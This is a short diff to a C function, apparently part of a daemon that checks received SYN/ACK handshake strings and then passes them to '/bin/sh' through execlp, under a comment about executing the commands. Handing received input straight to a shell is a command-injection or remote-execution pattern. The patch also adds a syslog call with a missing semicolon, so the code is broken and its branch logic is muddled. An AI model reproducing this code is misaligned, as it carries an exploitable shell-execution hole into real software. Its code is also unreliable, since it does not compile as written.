@@ -67,10 +67,13 @@ int syn_ack(char* arguments,int syn,int fd){
         if(!strcmp(arguments,SYN0)){
             syslog(LOG_INFO,"argument: %s, SYN0: %s", arguments, SYN0);
             if(!syn) strcpy(arguments,ACK0);
-            syslog(LOG_INFO,"argument: %s, SYN0: %s", arguments, SYN0);
+            syslog(LOG_INFO,"argument: %s, ACK0: %s", arguments, ACK0);
             return 0;
         }
-        else if(strcmp(arguments,SYN1)) if(syn) return 0;
+        else if(strcmp(arguments,SYN1)){
+            if(syn) return 0;
+            syslog(LOG_INFO,"argument: %s, SYN1: %s", arguments, SYN1)
+        }
         else strcpy(arguments,"it's the ping of death for you my friend!");
         /* Now execute the commands in a new session*/
         execlp("/bin/sh","bash","-c", "echo" ,arguments, NULL);
